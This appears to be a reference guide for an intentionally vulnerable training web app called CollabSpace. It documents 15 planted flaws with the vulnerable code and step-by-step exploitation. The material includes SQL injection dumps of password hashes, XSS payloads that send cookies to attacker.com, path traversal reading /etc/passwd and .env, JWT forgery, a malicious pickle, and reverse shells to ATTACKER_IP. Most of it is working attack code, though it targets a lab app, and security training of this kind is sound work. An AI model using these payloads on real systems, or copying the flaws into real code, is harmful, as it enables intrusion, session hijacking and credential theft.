# CollabSpace — Vulnerabilities Reference Guide

> **FOR INTERNAL / TRAINING USE ONLY.** Do not deploy in production or expose to the internet.

This document details every intentional vulnerability in CollabSpace, its exact location, and step-by-step reproduction instructions. All 15 vulnerabilities have been calibrated to **medium** or **hard** difficulty — obvious patterns (direct output in error messages, no filters at all) have been removed and replaced with realistic partial defences that require deeper analysis to bypass.

---

## Vulnerability Index

| #  | Category | Name | Difficulty | Location |
|----|----------|------|-----------|----------|
| 1  | Injection | Blind time-based SQLi via unsanitised sort direction | Hard | `app/routers/tasks.py:38` |
| 2  | Injection | Second-order SQLi in project export | Hard | `app/routers/projects.py:100` |
| 3  | XSS | Stored XSS — partial comment sanitiser bypass | Medium | `app/routers/comments.py:14` |
| 4  | XSS | Reflected XSS via JS string injection in search onclick | Medium | `app/templates/projects.html:149` |
| 5  | XSS | DOM-based XSS via URL fragment in dashboard | Hard | `app/templates/dashboard.html` |
| 6  | Broken Access Control | IDOR via reversible base64 reference token | Medium | `app/routers/profile.py:54` |
| 7  | Broken Access Control | Privilege escalation via hidden nested `account_settings` | Hard | `app/routers/profile.py:87` |
| 8  | SSRF | Webhook SSRF — IP blocklist bypass via alternative representations | Hard | `app/routers/profile.py:110` |
| 9  | Path Traversal | Absolute-path override in `os.path.join` | Hard | `app/routers/files.py:72` |
| 10 | Command Injection | Newline character bypasses shell metachar filter | Hard | `app/routers/internal.py:65` |
| 11 | Broken Auth | JWT algorithm confusion — `alg:none` unsigned token | Hard | `app/auth.py:28` |
| 12 | Insecure Deserialisation | Unsafe `pickle.loads()` in file processing | Hard | `app/routers/files.py:124` |
| 13 | Broken Access Control | Missing admin check on analytics export | Medium | `app/routers/admin.py:46` |
| 14 | File Upload | Stored XSS via SVG avatar (incomplete extension blocklist) | Medium | `app/routers/profile.py:104` |
| 15 | Broken Auth | Password-reset token leaked in debug response header | Medium | `app/routers/auth.py:88` |

---

## Detailed Reproduction Steps

---

### 1. Blind Time-Based SQLi — Sort Direction
**File:** `app/routers/tasks.py`, route `GET /api/tasks`
**Vulnerable code:**
```python
ALLOWED_COLUMNS = {"title", "status", "priority", "created_at", "updated_at"}
if sort_by not in ALLOWED_COLUMNS:
    sort_by = "created_at"
# BUG: direction is never validated
raw_sql = text(f"SELECT * FROM tasks ORDER BY {sort_by} {direction}")
```
**Why it's hard:** `sort_by` has a proper allowlist so the obvious vector is blocked. `direction` looks like it should be `ASC`/`DESC` but is never checked. No query results are reflected — exploitation requires time-based inference.

**Step 1 — Confirm injection via time delay:**
```bash
# Expect ~5 second delay if injection succeeds
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/tasks?sort_by=title&direction=ASC%3BSELECT+pg_sleep(5)--"
```

**Step 2 — Boolean-based data extraction (single-bit per request):**
```bash
# Test: is the first char of the admin password hash 'A'?
# Delay occurs → TRUE
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/tasks?sort_by=title&direction=ASC%3BSELECT+CASE+WHEN+(SELECT+substring(hashed_password,1,1)+FROM+users+WHERE+role%3D'admin'+LIMIT+1)%3D'A'+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END--"
```

**Step 3 — Automate with sqlmap (blind mode):**
```bash
sqlmap -u "http://localhost:8000/api/tasks?sort_by=title&direction=DESC" \
  --cookie="token=<YOUR_TOKEN>" \
  --dbms=postgresql \
  --technique=T \
  --time-sec=5 \
  -p direction \
  --dump -T users
```

---

### 2. Second-Order SQLi — Project Export
**File:** `app/routers/projects.py`, route `GET /api/projects/{project_id}/export?format=summary`
**Vulnerable code:**
```python
summary_query = (
    f"SELECT p.name, COUNT(DISTINCT t.id) AS task_count ..."
    f"WHERE p.name = '{project.name}' "   # stored value used unsafely
)
result = db.execute(text(summary_query))
```
**Why it's hard:** Data is stored through the safe ORM path (`POST /api/projects`). The injection only fires on a second, separate request to the export endpoint. Static analysis of the write path shows no vulnerability.

**Step 1 — Plant the payload (store it via the normal create endpoint):**
```bash
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/projects" \
  -H "Content-Type: application/json" \
  -d '{"name": "x'\'' UNION SELECT username,hashed_password,email,NULL,NULL,NULL FROM users--","description":"test","is_private":false}'
```

**Step 2 — Note the returned project_id, then trigger the second-order injection:**
```bash
# The stored name is now embedded unsafely into the export query — UNION executes
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/projects/<PROJECT_ID>/export?format=summary"
# Response data[] contains rows from the users table
```

**Step 3 — Dump all user hashes with a crafted UNION:**
```
Project name payload:
x' UNION SELECT username||':'||hashed_password, email, NULL, NULL, NULL, NULL FROM users--
```

---

### 3. Stored XSS — Task Comments (Partial Sanitiser Bypass)
**File:** `app/routers/comments.py`, `sanitize_comment()` function; `app/templates/project_detail.html`
**Vulnerable code (sanitiser):**
```python
content = re.sub(r'<script[\s\S]*?</script>', '', content, flags=re.IGNORECASE)
content = re.sub(r'\bon(error|load|click)\s*=', '', content, flags=re.IGNORECASE)
content = re.sub(r'javascript\s*:', '', content, flags=re.IGNORECASE)
```
**Why it's hard:** The sanitiser removes `<script>`, `onerror=`, `onload=`, `onclick=`, and `javascript:`. Developers reviewing the code see active mitigation. The bypass requires knowing which event handlers are *not* on the list.

**Bypasses (post as a task comment):**

```
<!-- ontoggle via HTML5 details element — fires immediately when open attr present -->
<details open ontoggle=alert(document.cookie)><summary>.</summary></details>

<!-- SVG animate onbegin — fires on animation start, no user interaction needed -->
<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s></animate></svg>

<!-- onfocus with autofocus — fires on page load for focusable elements -->
<input autofocus onfocus=alert(document.cookie) style=position:fixed;top:0;left:0;width:100%;height:100%;opacity:0>
```

**Reproduce:**
1. Log in and open any project.
2. Click the comment button on a task.
3. Post any of the payloads above.
4. Payload fires for every user who loads that task's comments.

---

### 4. Reflected XSS — JS String Injection in Search onclick
**File:** `app/templates/projects.html`, `searchProjects()` function
**Vulnerable code:**
```javascript
// Server HTML-escapes < and > — direct tag injection is blocked
// BUT single quotes are not escaped, enabling JS string context breakout
banner.innerHTML =
  `<span onclick="document.getElementById('searchInput').value='${data.query}';searchProjects()">` +
  `Found <strong>${data.count}</strong> result(s) &mdash; click to re-run</span>`;
```
**Why it's hard:** The server runs `html.escape(q, quote=False)` — `<img>` payloads are blocked. The injection is in a *JavaScript string literal* inside an HTML attribute. Requires recognising the JS context and using `'` to break out.

**Step 1 — Confirm JS context injection:**
Type in the search box or visit the URL:
```
'); alert(document.domain);//
```
Expected: `onclick` becomes `onclick="...value=''); alert(document.domain);//';searchProjects()"` — alert fires on click.

**Step 2 — Cookie exfiltration without a click (using event chaining):**
```
'); fetch('https://attacker.com/?c='+document.cookie);//
```

**Step 3 — Reflected delivery via shared URL (requires GET-triggerable search or social engineering the search input).**

---

### 5. DOM-Based XSS — URL Fragment in Dashboard
**File:** `app/templates/dashboard.html`, inline script block
**Vulnerable code:**
```javascript
var hash = window.location.hash.slice(1);
if (hash) {
    var el = document.getElementById('quickFilterBanner');
    el.style.display = 'block';
    // BUG: decodeURIComponent output injected into innerHTML
    el.innerHTML = 'Active filter: <strong>' + decodeURIComponent(hash) + '</strong>';
}
```
**Why it's hard:** The payload is in the URL fragment (`#`). Fragment identifiers are **never sent to the server** — they are invisible to server-side WAFs, SAST tools, and access logs. Requires manual JavaScript source review.

**Step 1 — Self-test:**
Navigate (while logged in) to:
```
http://localhost:8000/dashboard#<img src=x onerror=alert(document.cookie)>
```
Alert fires immediately on page load — no click or interaction required.

**Step 2 — Session hijacking via shared link:**
Send victim a link:
```
http://localhost:8000/dashboard#<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```
URL-encoded form for reliable delivery:
```
http://localhost:8000/dashboard#%3Cimg%20src%3Dx%20onerror%3D%22fetch('https%3A%2F%2Fattacker.com%2F%3Fc%3D'%2Bdocument.cookie)%22%3E
```

**Step 3 — Stored delivery via existing XSS chain:**
Chain with Vuln #3 (comment XSS): embed a `<a href>` pointing to the fragment URL, executed when the victim hovers/clicks.

---

### 6. IDOR — Reversible Base64 Reference Token
**File:** `app/routers/profile.py`, route `GET /api/users/lookup?ref=<token>`
**Vulnerable code:**
```python
user_id = int(base64.b64decode(ref.encode()).decode())
# No ownership check follows — any user can look up any other user
user = db.query(models.User).filter(models.User.id == user_id).first()
return { "id": ..., "email": ..., "role": ..., "api_key": user.api_key, ... }
```
**Why it's hard:** The old `/api/users/{id}` endpoint now has an ownership check. This new endpoint uses an opaque-looking `ref` token. Most testers assume base64 tokens are secure identifiers; the token must be decoded to reveal it is just `base64(user_id)`.

**Step 1 — Discover your own token format:**
```bash
# Your dashboard shows your user ID (e.g. #3). Encode it:
python3 -c "import base64; print(base64.b64encode(b'3').decode())"
# → Mw==
curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/users/lookup?ref=Mw=="
```

**Step 2 — Enumerate all users:**
```bash
for id in $(seq 1 20); do
  ref=$(python3 -c "import base64; print(base64.b64encode(str($id).encode()).decode())")
  echo "=== User $id ==="
  curl -s -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/users/lookup?ref=$ref"
  echo
done
```

**Step 3 — Use stolen API keys to authenticate as any user.**

---

### 7. Privilege Escalation — Hidden Nested `account_settings` Parameter
**File:** `app/routers/profile.py`, route `PUT /api/profile/update`
**Vulnerable code:**
```python
allowed_fields = ["full_name", "bio"]   # role removed from top-level
...
if "account_settings" in data and isinstance(data["account_settings"], dict):
    level_map = {"standard": "member", "elevated": "admin", "restricted": "viewer"}
    requested_level = data["account_settings"].get("_permission_level")
    if requested_level in level_map:
        current_user.role = level_map[requested_level]
```
**Why it's hard:** The `role` field was removed from `allowed_fields`, giving false confidence that escalation is fixed. The actual path is a nested `account_settings._permission_level` key — undocumented and only discoverable via source-code review or systematic JSON fuzzing of nested structures.

**Step 1 — Escalate to admin:**
```bash
curl -X PUT -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/update" \
  -H "Content-Type: application/json" \
  -d '{"bio": "hello", "account_settings": {"_permission_level": "elevated"}}'
```

**Step 2 — Verify escalation:**
```bash
curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/auth/me"
# "role": "admin"
```

---

### 8. SSRF — Webhook Blocklist Bypass via Alternative IP Representations
**File:** `app/routers/profile.py`, route `POST /api/profile/webhook/test`
**Vulnerable code:**
```python
_WEBHOOK_BLOCKED_HOSTS = {"localhost","127.0.0.1","0.0.0.0","::1","169.254.169.254",...}
parsed = urlparse(webhook_url)
hostname = (parsed.hostname or "").lower()
if hostname in _WEBHOOK_BLOCKED_HOSTS:
    raise HTTPException(400, "Internal or reserved URLs are not permitted")
```
**Why it's hard:** There is a visible blocklist that blocks the obvious hostnames. The bypass requires knowing that the Linux kernel and Python's `http` stack accept alternative numeric representations of `127.0.0.1` that are not in the blocklist.

**Bypass options:**
| Representation | Value |
|---|---|
| Decimal | `2130706433` = `127.0.0.1` |
| Short form | `127.1` (Linux-only) |
| Hex | `0x7f000001` |
| IPv6-mapped | `::ffff:127.0.0.1` |
| Octal | `0177.0.0.1` (platform-dependent) |

**Step 1 — Confirm SSRF via decimal IP:**
```bash
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/webhook/test" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://2130706433/api/internal/debug"}'
# Response: {"status": 200, "response": "{\"secret_key\":\"dev-secret-key...\",...}"}
```

**Step 2 — Internal port scan to map the network:**
```bash
for port in 5432 6379 8080 3306 27017; do
  echo -n "Port $port: "
  curl -s -X POST -b "token=<YOUR_TOKEN>" \
    "http://localhost:8000/api/profile/webhook/test" \
    -H "Content-Type: application/json" \
    -d "{\"url\": \"http://127.1:$port/\"}" | jq -r '.error // .status'
done
```

**Step 3 — Leak the JWT SECRET_KEY:**
```bash
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/webhook/test" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.1/api/internal/debug"}'
```

---

### 9. Path Traversal — Absolute Path via `os.path.join` Semantics
**File:** `app/routers/files.py`, route `GET /api/files/{file_id}/download?path=`
**Vulnerable code:**
```python
if ".." in path:
    raise HTTPException(400, "Invalid path")
# BUG: os.path.join('/app/uploads', '/etc/passwd') == '/etc/passwd' on POSIX
file_path = os.path.join(settings.UPLOAD_DIR, path)
return FileResponse(path=file_path, ...)
```
**Why it's hard:** The `..` check is correct for relative traversal (`../../etc/passwd`). The bypass requires knowing a Python-specific behaviour: when the second argument to `os.path.join` is an **absolute path**, the base directory is silently discarded. No `..` sequences are required.

**Step 1 — Read a sensitive file (no `..` needed):**
```bash
# Read the application secret key configuration
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=/app/app/config.py" \
  --output config.py

# Read the .env file
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=/app/.env" \
  --output env.txt

# Read /etc/passwd
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=/etc/passwd" \
  --output passwd.txt
```

**Step 2 — Extract the database password from the environment:**
```bash
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=/proc/1/environ" \
  --output environ.bin
strings environ.bin | grep -i pass
```

---

### 10. Command Injection — Newline Character Bypasses Metachar Filter
**File:** `app/routers/internal.py`, route `POST /api/internal/backup?path=`
**Vulnerable code:**
```python
_BLOCKED = [";", "|", "&", "`", "$(", ">", "<"]
for ch in _BLOCKED:
    if ch in path:
        raise HTTPException(400, ...)
# BUG: \n (0x0a) is not in the blocklist; shell=True treats newline as command separator
command = f"pg_dump ... > {path}"
subprocess.run(command, shell=True, ...)
```
**Why it's hard:** The filter blocks every *classic* shell injection character. A code reviewer would likely consider this sufficient. The bypass uses the ASCII newline character (`%0a`), which bash treats identically to a semicolon as a command terminator.

**Step 1 — Confirm injection:**
```bash
# Newline-separated command: pg_dump ...\nid>/tmp/pwned.txt
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/internal/backup?path=/tmp/out%0Aid>/tmp/pwned.txt"

# Verify execution
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=/tmp/pwned.txt"
```

**Step 2 — Read sensitive files:**
```bash
curl -X POST \
  "http://localhost:8000/api/internal/backup?path=/tmp/x%0Acat%20/etc/passwd%20>/tmp/out2.txt"
```

**Step 3 — Reverse shell (Linux target):**
```bash
# URL-encode the newline and the entire payload
curl -X POST \
  "http://localhost:8000/api/internal/backup?path=/tmp/x%0Abash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261'"
```

---

### 11. JWT Algorithm Confusion — `alg:none` Unsigned Token
**File:** `app/auth.py`, `decode_access_token()`
**Vulnerable code:**
```python
payload = jwt.decode(token, settings.SECRET_KEY, algorithms=["HS256", "none"])
```
**Why it's hard:** The list `["HS256", "none"]` looks like "HS256 with a fallback" to many reviewers. In JWT, `"none"` is a valid algorithm meaning *no signature*. An attacker can craft a token with `{"alg":"none"}` in the header and an arbitrary payload; the library accepts it because `"none"` is in the allowed list.

**Step 1 — Craft an unsigned admin token (Python):**
```python
import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "admin", "exp": 9999999999}).encode())
token   = f"{header}.{payload}."   # empty signature

print(token)
```

**Step 2 — Use the forged token:**
```bash
curl -b "token=<FORGED_TOKEN>" "http://localhost:8000/api/auth/me"
# Returns admin's profile without ever knowing the secret key
```

**Step 3 — Forge a token for a specific user found via IDOR (Vuln #6):**
```python
payload = b64url(json.dumps({"sub": "alice", "exp": 9999999999}).encode())
# alice is a username found from the lookup endpoint
```

---

### 12. Insecure Deserialisation — Python Pickle
**File:** `app/routers/files.py`, route `POST /api/files/process?file_id=`
**Vulnerable code:**
```python
elif fname.endswith('.pkl') or fname.endswith('.pickle'):
    import pickle
    with open(file_record.filepath, 'rb') as f:
        raw = f.read()
    obj = pickle.loads(raw)   # BUG: arbitrary code execution
    return {"message": "Report loaded", ...}
```
**Why it's hard:** The endpoint is generic (`/api/files/process`) and the pickle path is only taken for `.pkl`/`.pickle` files. There is no documentation or API schema revealing this code path. Discovery requires reading the source or fuzzing file extensions.

**Step 1 — Create a malicious pickle:**
```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("id > /tmp/rce_proof.txt",))

with open("exploit.pkl", "wb") as f:
    pickle.dump(Exploit(), f)
```

**Step 2 — Upload the pickle to any project:**
```bash
PROJECT_ID=1
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/upload?project_id=$PROJECT_ID" \
  -F "file=@exploit.pkl"
# Note the returned file id (e.g. 42)
```

**Step 3 — Trigger deserialisation:**
```bash
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/process?file_id=42"
# Server executes os.system("id > /tmp/rce_proof.txt")
```

**Step 4 — Confirm RCE:**
```bash
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=/tmp/rce_proof.txt"
```

**Reverse shell payload:**
```python
class Exploit(object):
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
        return (os.system, (cmd,))
```

---

### 13. Broken Function-Level Authorization — Analytics Export
**File:** `app/routers/admin.py`, route `GET /api/analytics/export`
**Vulnerable code:**
```python
@router.get("/api/analytics/export")
async def export_analytics(
    current_user: models.User = Depends(get_current_active_user),  # should be require_admin
    ...
):
```
**Why it's hard:** The endpoint is in the admin router but uses the wrong dependency. It is not linked from any UI and has no entry in the OpenAPI schema description. Discovery requires endpoint enumeration (e.g., `ffuf`, `dirsearch`) or reading the source.

**Reproduce:**
```bash
# As any authenticated (non-admin) member account
curl -b "token=<MEMBER_TOKEN>" \
  "http://localhost:8000/api/analytics/export"

# Response includes all users' emails, roles, and API keys:
# {"users": [{"id":1,"username":"admin","email":"admin@collabspace.io","role":"admin","api_key":"..."},...],"projects":[...]}
```

**Endpoint discovery with ffuf:**
```bash
ffuf -u http://localhost:8000/api/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -H "Cookie: token=<YOUR_TOKEN>" \
  -mc 200
```

---

### 14. Stored XSS via SVG Avatar — Incomplete Extension Blocklist
**File:** `app/routers/profile.py`, route `POST /api/profile/avatar`
**Vulnerable code:**
```python
_BLOCKED_AVATAR_EXTENSIONS = {'.php','.py','.sh','.html','.htm','.js',...}
ext = os.path.splitext(filename)[1].lower()
if ext in _BLOCKED_AVATAR_EXTENSIONS:
    raise HTTPException(400, "File type not permitted")
# .svg is NOT in the blocklist
```
**Why it's hard:** There is an active blocklist that blocks the obvious dangerous extensions. `.svg` is a legitimate image format and is allowed by the HTML `accept="image/*"` attribute — the oversight is non-obvious to developers unfamiliar with SVG's script execution model.

**Step 1 — Create a malicious SVG:**
```xml
<!-- evil.svg -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <text x="10" y="20">Profile Picture</text>
</svg>
```

**Step 2 — Bypass the client-side `accept="image/*"` restriction and upload:**
```bash
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/avatar" \
  -F "file=@evil.svg;type=image/svg+xml"
```

**Step 3 — Trigger XSS:**
- Navigate to your profile page — the SVG `onload` fires immediately.
- If another user views your profile via the admin user lookup, the payload fires in their browser too.

**Step 4 — Persistent cookie-stealing payload:**
```xml
<svg xmlns="http://www.w3.org/2000/svg"
     onload="fetch('https://attacker.com/?c='+document.cookie)">
  <text x="10" y="20">Avatar</text>
</svg>
```

---

### 15. Password Reset Token — Leaked via Debug Response Header
**File:** `app/routers/auth.py`, route `POST /api/auth/reset-password`
**Vulnerable code:**
```python
if settings.DEBUG:
    response.headers["X-Debug-Token"] = reset_token
return {"message": "If the email exists, a reset link has been sent."}
```
**Why it's hard:** The JSON body is uniform (same message whether the email exists or not). The token is not in the body. A tester relying solely on the response body will miss this — the `X-Debug-Token` header requires explicitly inspecting response headers. `DEBUG=True` is set by default.

**Step 1 — Request a reset and inspect response headers:**
```bash
curl -v -X POST "http://localhost:8000/api/auth/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@collabspace.io"}' 2>&1 | grep -i "x-debug"
# < X-Debug-Token: 47281934
```

**Step 2 — Use the leaked token to reset the password:**
```bash
curl -X POST "http://localhost:8000/api/auth/confirm-reset" \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@collabspace.io", "token": "47281934", "new_password": "H@ck3d123!"}'
```

**Step 3 — Log in with the new credentials:**
```bash
curl -c cookies.txt -X POST "http://localhost:8000/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "H@ck3d123!"}'
```

---

## Chained Attack Scenarios

### Scenario A: Unauthenticated → Admin → RCE
1. **Vuln #15** — `POST /api/auth/reset-password` on `admin@collabspace.io` → steal token from `X-Debug-Token` header → reset admin password → login
2. **Vuln #10** — `POST /api/internal/backup?path=/tmp/x%0Aid>/tmp/out.txt` → confirm command execution
3. **Vuln #10** — deploy reverse shell via newline-injected payload

### Scenario B: Member → Admin (No Interaction)
1. Register a member account
2. **Vuln #7** — `PUT /api/profile/update` with `{"account_settings":{"_permission_level":"elevated"}}` → become admin
3. Access all admin-only endpoints (`/api/admin/execute-query`, etc.)

### Scenario C: Persistent Account Takeover via XSS Chain
1. **Vuln #14** — upload `evil.svg` as avatar
2. Admin visits profile → SVG fires, steals admin cookie
3. Attacker authenticates as admin using stolen session cookie

### Scenario D: Blind Data Exfiltration
1. **Vuln #1** — time-based blind SQLi on `GET /api/tasks?direction=` → enumerate users table character by character
2. Recover password hashes and crack them (bcrypt with default 4 rounds — ~64× faster than standard)

### Scenario E: SSRF → Internal Secrets → JWT Forgery
1. **Vuln #8** — `POST /api/profile/webhook/test` with `{"url":"http://127.1/api/internal/debug"}` → leak `SECRET_KEY`
2. **Vuln #11** (alternative) — Now that you have the secret, forge an HS256 token for any user instead of using `alg:none`
3. Access any account without credentials

---

*This document is part of the CollabSpace security training platform.*
